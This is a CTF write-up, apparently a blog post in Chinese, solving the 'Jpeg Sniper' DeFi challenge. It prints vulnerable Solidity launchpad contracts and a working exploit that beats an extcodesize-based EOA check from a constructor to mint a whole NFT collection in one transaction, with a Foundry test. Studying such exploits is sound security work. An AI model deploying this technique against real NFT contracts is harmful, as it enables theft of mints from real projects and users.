---
title: Mr_steal-1
date: 2024-02-22 11:26:14
tags:
    - Defi
    - mr_steal_yo_crypto
---
# Jpeg Sniper

# Description

```solidity
Hopegs the NFT marketplace is launching the hyped NFT collection BOOTY soon.

They have a wrapper contract: FlatLaunchpeg, which handles the public sale mint for the collection.

Your task is to bypass their safeguards and max mint the entire collection in a single tx.
```

# Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./BaseLaunchpegNFT.sol";

/// @dev hopegs NFT exchange wrapper to manage mint
contract FlatLaunchpeg is BaseLaunchpegNFT {
    enum Phase {
        NotStarted,
        PublicSale
    }

    modifier atPhase(Phase _phase) {
        if (currentPhase() != _phase) {
            revert Launchpeg__WrongPhase();
        }
        _;
    }

    constructor(uint256 _collectionSize, uint256 _maxBatchSize, uint256 _maxPerAddressDuringMint)
        BaseLaunchpegNFT(_collectionSize, _maxBatchSize, _maxPerAddressDuringMint)
    {}

    /// @notice Mint NFTs during the public sale
    /// @param _quantity Quantity of NFTs to mint
    function publicSaleMint(uint256 _quantity) external payable isEOA atPhase(Phase.PublicSale) {
        if (numberMinted(msg.sender) + _quantity > maxPerAddressDuringMint) {
            revert Launchpeg__CanNotMintThisMany();
        }
        if (totalSupply() + _quantity > collectionSize) {
            revert Launchpeg__MaxSupplyReached();
        }
        uint256 total = salePrice * _quantity;

        _mintForUser(msg.sender, _quantity);
        _refundIfOver(total);
    }

    /// @notice Returns the current phase
    /// @return phase Current phase
    function currentPhase() public view returns (Phase) {
        if (publicSaleStartTime == 0 || block.timestamp < publicSaleStartTime) {
            return Phase.NotStarted;
        } else {
            return Phase.PublicSale;
        }
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import "../../lib/openzeppelin-contracts/contracts/access/Ownable.sol";
import "../../lib/openzeppelin-contracts/contracts/utils/Counters.sol";
import "./LaunchpegErrors.sol";

/// @dev base NFT contract
contract BaseLaunchpegNFT is ERC721, Ownable {
    using Counters for Counters.Counter;

    Counters.Counter private _tokenId;

    uint256 public collectionSize;
    uint256 public maxBatchSize;
    uint256 public salePrice; // free mint
    uint256 public maxPerAddressDuringMint;
    uint256 public publicSaleStartTime;

    modifier isEOA() {
        uint256 size;
        address sender = msg.sender;

        assembly {
            size := extcodesize(sender)
        }

        if (size > 0) revert Launchpeg__Unauthorized();
        _;
    }

    constructor(uint256 _collectionSize, uint256 _maxBatchSize, uint256 _maxPerAddressDuringMint)
        ERC721("BOOTY", "BOOTY")
    {
        collectionSize = _collectionSize;
        maxBatchSize = _maxBatchSize;
        maxPerAddressDuringMint = _maxPerAddressDuringMint;
        publicSaleStartTime = block.timestamp; // mint turned on this block
    }

    /// @notice Returns the number of NFTs minted by a specific address
    /// @param _owner The owner of the NFTs
    /// @return numberMinted Number of NFTs minted
    function numberMinted(address _owner) public view returns (uint256) {
        return balanceOf(_owner);
    }

    /// @dev returns the total amount minted
    function totalSupply() public view returns (uint256) {
        return _tokenId.current();
    }

    /// @dev mints n number of NFTs per user
    function _mintForUser(address to, uint256 quantity) internal {
        for (uint256 i = 0; i < quantity; i++) {
            _mint(to, _tokenId.current());
            _tokenId.increment();
        }
    }

    /// @dev Verifies that enough funds have been sent by the sender and refunds the extra tokens if any
    /// @param _price The price paid by the sender for minting NFTs
    function _refundIfOver(uint256 _price) internal {
        if (msg.value < _price) {
            revert Launchpeg__NotEnoughFunds(msg.value);
        }
        if (msg.value > _price) {
            (bool success,) = msg.sender.call{value: msg.value - _price}("");
            if (!success) {
                revert Launchpeg__TransferFailed();
            }
        }
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

error Launchpeg__CanNotMintThisMany();
error Launchpeg__MaxSupplyReached();
error Launchpeg__NotEnoughFunds(uint256 fundsSent);
error Launchpeg__TransferFailed();
error Launchpeg__Unauthorized();
error Launchpeg__WrongPhase();
```

# Observation

---

`BaseLaunchpegNFT.sol`:实现了`NFT`功能，有一个`modifier`

`FlatLaunchpeg.sol`:引入了`BaseNFT`，实现了`mint`功能

`LaunchpegErrors.sol`:定义了一些`Error`

# Vuln

---

我们的目标是获取`mint`的所有的`NFT`，根据`deploy`我们可以知道:

```solidity
nft = new FlatLaunchpeg(69, 5, 5);
```

```solidity
constructor(uint256 _collectionSize, uint256 _maxBatchSize, uint256 _maxPerAddressDuringMint)
        ERC721("BOOTY", "BOOTY")
    {
        collectionSize = _collectionSize;
        maxBatchSize = _maxBatchSize;
        maxPerAddressDuringMint = _maxPerAddressDuringMint;
        publicSaleStartTime = block.timestamp; // mint turned on this block
    }
```

我们总共`mint`了69个`NFT`，同时一次最多`mint5`个，每个人最多`mint`5个。

## Bypass Modifier

在publicSaleMint函数中有一个`modifier`::`isEOA`

```solidity
function publicSaleMint(uint256 _quantity) external payable isEOA atPhase(Phase.PublicSale) {
       ...
    }
```

```solidity
modifier isEOA() {
        uint256 size;
        address sender = msg.sender;

        assembly {
            size := extcodesize(sender)
        }

        if (size > 0) revert Launchpeg__Unauthorized();
        _;
    }
```

用来判断，调用者是不是`EOA`账户，如果不是的话则会`revert`。

我们知道在一个合约在创建的时候`extcodesize`为0，所以我们可以通过在`constructor`中调用函数的方式进行绕过。

## First try(Failed)

在一开始我看见_refundIfOver函数的时候，我下意识的觉得这里有一个reentrancy漏洞，

```solidity
function _refundIfOver(uint256 _price) internal {
        if (msg.value < _price) {
            revert Launchpeg__NotEnoughFunds(msg.value);
        }
        if (msg.value > _price) {
            (bool success,) = msg.sender.call{value: msg.value - _price}("");
            if (!success) {
                revert Launchpeg__TransferFailed();
            }
        }
    }
```

在后续尝试的时候失败了，才知道receiv()函数只有在合约完全部署后才会启动，因为我们要bypass isEOA，所以在这里无法进行冲入攻击

## Second try

所以我在思考，有没有别的方式来进行攻击。

一个简单的想法出现了，那我们就在合约来再创建一个合约，构造一个`for`循环，然后每一个合约`mint`之后再通过`selfdestruct`转给`attacker`，就可以达到效果了。

# Attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IFlatLaunchpeg {
    function publicSaleMint(uint256 _quantity) external payable;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external returns (uint256);
    function maxPerAddressDuringMint() external returns (uint256);
    function collectionSize() external returns (uint256);
}

contract JpegSniperExploiter {
    constructor(address nftaddress, address to) {
        runExploit(nftaddress, to);
    }

    function runExploit(address nftaddress, address to) public {
        IFlatLaunchpeg nft = IFlatLaunchpeg(nftaddress);
        uint256 maxPerAddress = nft.maxPerAddressDuringMint();

        uint256 collectionSize = nft.collectionSize();
        uint256 starttotalSupply = nft.totalSupply();

        uint256 loops = (collectionSize - starttotalSupply) / maxPerAddress;
        for (uint256 i = 0; i < loops; i++) {
            new Attack(nft, to, maxPerAddress, starttotalSupply);
            starttotalSupply += maxPerAddress;
        }

        uint256 mintRemainder = (collectionSize - starttotalSupply) % maxPerAddress;
        if (mintRemainder > 0) new Attack(nft, to, mintRemainder, starttotalSupply);
    }
}

contract Attack {
    constructor(IFlatLaunchpeg nft, address to, uint256 amountToMint, uint256 startIndex) {
        nft.publicSaleMint{value: 0}(amountToMint); // free mint
        for (uint256 i = 0; i < amountToMint; i++) {
            nft.transferFrom(address(this), to, startIndex + i);
        }
        selfdestruct(payable(to)); // potential gas refund
    }
}
```

Test.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "../src/jpeg-sniper/FlatLaunchpeg.sol";
import "../src/jpeg-sniper/JPAttack.sol";

contract jpTest is Test {
    address public owner;
    address public attacker;
    address public user1;
    address public user2;
    FlatLaunchpeg public nft;

    function setUp() public {
        attacker = makeAddr("attacker");
        owner = makeAddr("owner");
        vm.deal(attacker, 10_000 ether);
        vm.deal(owner, 10_000 ether);
        vm.startPrank(owner);
        nft = new FlatLaunchpeg(69, 5, 5);
        vm.stopPrank();
    }
    /// solves the challenge

    function testChallengeExploit() public {
        vm.startPrank(attacker);

        // implement solution here
        JpegSniperExploiter exp = new JpegSniperExploiter(address(nft), attacker);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker mints out collection in one tx
        assertEq(nft.totalSupply(), 69);
        assertEq(nft.balanceOf(attacker), 69);
    }
}

```

# Summary

- 通过在构造函数中调用函数，`bypass` `extcodesize`判断。
- receive()只能在合约完全部署后才起作用